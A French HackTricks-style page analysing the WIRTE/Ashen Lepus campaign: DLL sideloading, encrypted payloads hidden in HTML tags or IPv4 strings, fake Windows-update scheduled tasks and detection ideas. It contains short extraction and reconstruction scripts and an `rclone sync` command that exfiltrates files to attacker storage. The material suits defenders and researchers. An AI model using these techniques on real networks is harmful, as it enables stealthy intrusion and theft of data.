# Side-Loading avancé de DLL avec staging de payload intégré au HTML

{{#include ../../../banners/hacktricks-training.md}}

## Aperçu des méthodes opératoires

Ashen Lepus (alias WIRTE) a militarisé un schéma reproductible combinant le DLL sideloading, des payloads HTML livrés par étapes et des backdoors .NET modulaires pour s’implanter dans des réseaux diplomatiques du Moyen-Orient. Cette technique peut être réutilisée par n’importe quel opérateur, car elle repose sur :<sup>[[1]](#references)</sup>

- **Ingénierie sociale basée sur des archives** : des fichiers PDF anodins demandent aux cibles de télécharger une archive RAR depuis un site de partage de fichiers. L’archive contient un EXE de visionneuse de documents d’apparence légitime, une DLL malveillante portant le nom d’une bibliothèque de confiance (par ex. `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll`) et un fichier leurre `Document.pdf`.
- **Abus de l’ordre de recherche des DLL** : la victime double-clique sur l’EXE, Windows résout l’import de DLL depuis le répertoire courant, et le chargeur malveillant (AshenLoader) s’exécute dans le processus de confiance tandis que le PDF leurre s’ouvre pour ne pas éveiller les soupçons.
- **Staging par détournement d’outils légitimes** : chaque étape ultérieure (AshenStager → AshenOrchestrator → modules) reste hors disque jusqu’à ce qu’elle soit nécessaire et est livrée sous forme de blobs chiffrés dissimulés dans des réponses HTML par ailleurs inoffensives.

## Chaîne de Side-Loading à plusieurs étapes

1. **EXE leurre → AshenLoader** : l’EXE effectue le sideload d’AshenLoader, qui effectue la reconnaissance de l’hôte, chiffre les données avec AES-CTR et les envoie par POST dans des paramètres tournants tels que `token=`, `id=`, `q=` ou `auth=` vers des chemins d’apparence API (par ex. `/api/v2/account`).<sup>[[1]](#references)</sup>
2. **Extraction du HTML** : le C2 ne révèle l’étape suivante que si l’adresse IP du client est géolocalisée dans la région ciblée et que le `User-Agent` correspond à l’implant, ce qui déjoue les sandboxes. Si les vérifications réussissent, le corps HTTP contient un blob `<headerp>...</headerp>` avec le payload AshenStager chiffré en Base64/AES-CTR.
3. **Second sideload** : AshenStager est déployé avec un autre binaire légitime qui importe `wtsapi32.dll`. La copie malveillante injectée dans le binaire récupère davantage de HTML, puis extrait cette fois le contenu de `<article>...</article>` pour récupérer AshenOrchestrator.
4. **AshenOrchestrator** : un contrôleur .NET modulaire qui décode une configuration JSON en Base64. Les champs `tg` et `au` de la configuration sont concaténés/hachés pour former la clé AES, qui déchiffre `xrk`. Les octets obtenus servent de clé XOR pour chaque blob de module récupéré par la suite.
5. **Livraison des modules** : chaque module est décrit au moyen de commentaires HTML qui redirigent l’analyseur vers une balise arbitraire, déjouant les règles statiques qui ne recherchent que `<headerp>` ou `<article>`. Les modules incluent la persistance (`PR*`), des désinstallateurs (`UN*`), la reconnaissance (`SN`), la capture d’écran (`SCT`) et l’exploration de fichiers (`FE`).

### Schéma d’analyse des conteneurs HTML

```csharp
var tag = Regex.Match(html, "<!--\s*TAG:\s*<(.*?)>\s*-->").Groups[1].Value;
var base64 = Regex.Match(html, $"<{tag}>(.*?)</{tag}>", RegexOptions.Singleline).Groups[1].Value;
var aesBytes = AesCtrDecrypt(Convert.FromBase64String(base64), key, nonce);
var module = XorBytes(aesBytes, xorKey);
LoadModule(JsonDocument.Parse(Encoding.UTF8.GetString(module)));
```

Même si les défenseurs bloquent ou suppriment un élément spécifique, l’opérateur n’a qu’à modifier la balise indiquée dans le commentaire HTML pour reprendre la livraison.<sup>[[1]](#references)</sup>

### Outil rapide d’extraction (Python)

```python
import base64, re, requests

html = requests.get(url, headers={"User-Agent": ua}).text
tag = re.search(r"<!--\s*TAG:\s*<(.*?)>\s*-->", html, re.I).group(1)
b64 = re.search(fr"<{tag}>(.*?)</{tag}>", html, re.S | re.I).group(1)
blob = base64.b64decode(b64)
# decrypt blob with AES-CTR, then XOR if required
```

## Parallèles avec l’évasion par staging HTML

Des recherches récentes sur le HTML smuggling (Talos) mettent en évidence des payloads dissimulés sous forme de chaînes Base64 dans des blocs `<script>` de pièces jointes HTML, puis décodés à l’exécution par JavaScript.<sup>[[2]](#references)</sup> La même astuce peut être réutilisée pour les réponses C2 : placer des blobs chiffrés dans une balise script (ou un autre élément DOM), puis les décoder en mémoire avant AES/XOR, afin que la page ressemble à du HTML ordinaire. Talos montre également une obfuscation en plusieurs couches (renommage des identifiants, plus Base64/Caesar/AES) dans des balises script, une approche qui s’applique naturellement aux blobs C2 intégrés au HTML.<sup>[[2]](#references)</sup> Un article ultérieur de Talos sur le **hidden text salting** est également pertinent ici : découper le Base64 à l’aide de commentaires HTML ou d’espaces sans importance suffit à tromper les extracteurs regex simples, tout en gardant la reconstruction côté navigateur triviale.<sup>[[7]](#references)</sup>

## Notes sur les variantes récentes (2024-2025)

- Check Point a observé des campagnes WIRTE en 2024 qui reposaient toujours sur le sideloading à partir d’archives, mais utilisaient `propsys.dll` (stagerx64) comme première étape. Le stager décode le payload suivant avec Base64 + XOR (clé `53`), envoie des requêtes HTTP avec un `User-Agent` codé en dur et extrait des blobs chiffrés intégrés entre des balises HTML. Dans une branche, l’étape a été reconstruite à partir d’une longue liste de chaînes IP intégrées, décodées via `RtlIpv4StringToAddressA`, puis concaténées en octets de payload.<sup>[[3]](#references)</sup>
- OWN-CERT a documenté des outils WIRTE plus anciens, dans lesquels le dropper chargé par sideloading, `wtsapi32.dll`, protégeait les chaînes avec Base64 + TEA et utilisait le nom de la DLL lui-même comme clé de déchiffrement, puis obfusquait les données d’identification de l’hôte avec XOR/Base64 avant de les envoyer au C2.<sup>[[4]](#references)</sup>

## Reconstruction des étapes encodées en IP

La variante `propsys.dll` de WIRTE de 2024 montre que le PE suivant n’a pas besoin de se trouver dans un seul blob HTML contigu. Le loader peut stocker les octets de l’étape sous forme de chaînes en notation décimale pointée et les reconstituer avec `RtlIpv4StringToAddressA`, une méthode étroitement liée aux techniques **IPfuscation** de Hive.<sup>[[3]](#references)[[5]](#references)</sup> En pratique, cette approche est utile lorsque l’acteur veut que la page HTML contienne ce qui semble être des IOC ou des données de configuration inoffensifs plutôt qu’un payload Base64 évident.

```python
import pathlib, re, socket

text = pathlib.Path("stage.txt").read_text(encoding="utf-8")
ips = re.findall(r'((?:\d{1,3}\.){3}\d{1,3})', text)
blob = b"".join(socket.inet_aton(ip) for ip in ips)
pathlib.Path("stage.bin").write_bytes(blob)
```

Si les octets récupérés commencent par `MZ`, vous avez probablement reconstitué directement le PE suivant. Sinon, recherchez une couche XOR/Base64 initiale ou de petits délimiteurs entre les adresses.

## Noms de DLL interchangeables et rotation des hôtes

Une propriété intéressante de ce schéma est que le **backend de staging HTML/AES/XOR peut rester identique tandis que seule la paire de sideloading change**. WIRTE a utilisé tour à tour `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll` et `propsys.dll` dans différentes campagnes, ce qui est utile car :<sup>[[1]](#references)[[3]](#references)</sup>

- `propsys.dll` et `wtsapi32.dll` sont des noms de DLL Windows banals, dont les défenseurs s’attendent à trouver des fichiers dans `%System32%` / `%SysWOW64%`.
- Les catalogues publics tels que **HijackLibs** recensent déjà de nombreux binaires qui chargeront ces noms de DLL depuis un répertoire d’application copié, offrant aux opérateurs des hôtes de remplacement sans avoir à repenser le stager.
- Seule la surface d’exportation doit être adaptée à chaque hôte. L’analyseur HTML, les routines AES/XOR et le chargeur de modules peuvent généralement être transplantés tels quels dans une DLL proxy de transfert.

Pour les travaux en laboratoire offensif, cela signifie que vous pouvez décomposer le problème en **(1) trouver un hôte signé stable qui résout localement le nom de DLL choisi** et **(2) réutiliser la même logique de chargement de HTML stagé derrière cette DLL**.

## Durcissement de la crypto et du C2

- **AES-CTR partout** : les chargeurs actuels intègrent des clés de 256 bits ainsi que des nonces (par ex., `{9a 20 51 98 ...}`) et ajoutent parfois une couche XOR à l’aide de chaînes telles que `msasn1.dll` avant/après le déchiffrement.<sup>[[1]](#references)</sup>
- **Variations du matériel de clé** : les chargeurs antérieurs utilisaient Base64 + TEA pour protéger les chaînes intégrées, avec une clé de déchiffrement dérivée du nom de la DLL malveillante (par ex., `wtsapi32.dll`).<sup>[[4]](#references)</sup>
- **Séparation de l’infrastructure et camouflage des sous-domaines** : les serveurs de staging sont distincts pour chaque outil, hébergés sur différents ASN et parfois derrière des sous-domaines d’apparence légitime, de sorte que la compromission d’une étape n’expose pas les autres.
- **Dissimulation de la reconnaissance** : les données énumérées incluent désormais les listes de Program Files pour repérer les applications de grande valeur et sont toujours chiffrées avant de quitter l’hôte.
- **Rotation des URI** : les paramètres de requête et les chemins REST changent entre les campagnes (`/api/v1/account?token=` → `/api/v2/account?auth=`), rendant inopérantes les détections fragiles.
- **Verrouillage sur le User-Agent et redirections sûres** : l’infrastructure C2 ne répond qu’aux chaînes UA exactes et redirige sinon vers des sites d’actualités ou de santé anodins afin de se fondre dans le trafic.
- **Livraison contrôlée** : les serveurs sont géorestreints et ne répondent qu’aux implants réels. Les clients non autorisés reçoivent du HTML sans caractère suspect.

## Persistance et boucle d’exécution

AshenStager crée des tâches planifiées qui se font passer pour des tâches de maintenance Windows et s’exécutent via `svchost.exe`, par exemple :<sup>[[1]](#references)</sup>

- `C:\Windows\System32\Tasks\Windows\WindowsDefenderUpdate\Windows Defender Updater`
- `C:\Windows\System32\Tasks\Windows\WindowsServicesUpdate\Windows Services Updater`
- `C:\Windows\System32\Tasks\Automatic Windows Update`

Ces tâches relancent la chaîne de sideloading au démarrage ou à intervalles réguliers, permettant à AshenOrchestrator de demander de nouveaux modules sans avoir à réécrire sur le disque.

## Utiliser des clients de synchronisation légitimes pour l’exfiltration

Les opérateurs placent des documents diplomatiques dans `C:\Users\Public` (lisible par tous et peu suspect) à l’aide d’un module dédié, puis téléchargent le binaire légitime [Rclone](https://rclone.org/) pour synchroniser ce répertoire avec un stockage contrôlé par l’attaquant. Unit42 indique qu’il s’agit de la première observation de cet acteur utilisant Rclone pour l’exfiltration, conformément à la tendance générale consistant à détourner des outils de synchronisation légitimes pour se fondre dans le trafic normal :<sup>[[1]](#references)</sup>

1. **Préparer** : copier/collecter les fichiers ciblés dans `C:\Users\Public\{campaign}\`.
2. **Configurer** : fournir une configuration Rclone pointant vers un endpoint HTTPS contrôlé par l’attaquant (par ex., `api.technology-system[.]com`).
3. **Synchroniser** : exécuter `rclone sync "C:\Users\Public\campaign" remote:ingest --transfers 4 --bwlimit 4M --quiet` afin que le trafic ressemble à des sauvegardes cloud normales.

Rclone étant largement utilisé pour des tâches de sauvegarde légitimes, les défenseurs doivent se concentrer sur les exécutions anormales (nouveaux binaires, remotes inhabituels ou synchronisation soudaine de `C:\Users\Public`).

## Axes de détection

- Déclencher une alerte lorsqu’un **processus signé** charge de façon inattendue des DLL depuis des chemins accessibles en écriture par l’utilisateur (filtres Procmon + `Get-ProcessMitigation -Module`), en particulier lorsque les noms de DLL comprennent `netutils`, `srvcli`, `dwampi`, `wtsapi32` ou `propsys`.<sup>[[6]](#references)</sup>
- Examiner les réponses HTTPS suspectes à la recherche de **grands blocs Base64 intégrés dans des balises inhabituelles** ou protégés par des commentaires `<!-- TAG: <xyz> -->`.
- Normaliser d’abord le HTML : **supprimer les commentaires et réduire les espaces avant l’extraction Base64**, car les techniques d’évasion par salage de texte caché peuvent répartir les payloads entre plusieurs commentaires.
- Étendre la recherche dans le HTML aux **chaînes Base64 dans des blocs `<script>`** (staging de type HTML smuggling), décodées par JavaScript avant le traitement AES/XOR.
- Rechercher les appels répétés à **`RtlIpv4StringToAddressA` suivis de l’assemblage de buffers**, surtout lorsque les chaînes environnantes sont de longues listes d’adresses IPv4 plutôt que de véritables cibles réseau.
- Rechercher les **tâches planifiées** qui exécutent `svchost.exe` avec des arguments qui ne sont pas liés à un service ou qui pointent vers des répertoires de dropper.
- Suivre les **redirections C2** qui ne renvoient des payloads qu’avec des chaînes `User-Agent` exactes et redirigent sinon vers des domaines légitimes d’actualités ou de santé.
- Surveiller les binaires **Rclone** apparaissant en dehors des emplacements gérés par l’équipe informatique, les nouveaux fichiers `rclone.conf` ou les tâches de synchronisation accédant à des répertoires de staging tels que `C:\Users\Public`.

## References

- [1] [Ashen Lepus, affilié au Hamas, cible des entités diplomatiques du Moyen-Orient avec la nouvelle suite de malwares AshTag](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)
- [2] [Caché entre les balises : aperçu des techniques d’évasion dans le HTML smuggling](https://blog.talosintelligence.com/hidden-between-the-tags-insights-into-evasion-techniques-in-html-smuggling/)
- [3] [L’acteur de la menace WIRTE, affilié au Hamas, poursuit ses opérations au Moyen-Orient et passe à des activités perturbatrices](https://research.checkpoint.com/2024/hamas-affiliated-threat-actor-expands-to-disruptive-activity/)
- [4] [WIRTE : à la recherche du temps perdu](https://www.own.security/en/ressources/blog/wirte-analyse-campagne-cyber-own-cert)
- [5] [Le ransomware Hive déploie une nouvelle technique d’IPfuscation pour échapper à la détection](https://www.sentinelone.com/blog/hive-ransomware-deploys-novel-ipfuscation-technique/)
- [6] [Chargement potentiel de DLL système depuis des emplacements non système](https://detection.fyi/sigmahq/sigma/windows/image_load/image_load_side_load_from_non_system_location/)
- [7] [Assaisonner les menaces par e-mail avec du salage de texte caché](https://blog.talosintelligence.com/seasoning-email-threats-with-hidden-text-salting/)
{{#include ../../../banners/hacktricks-training.md}}
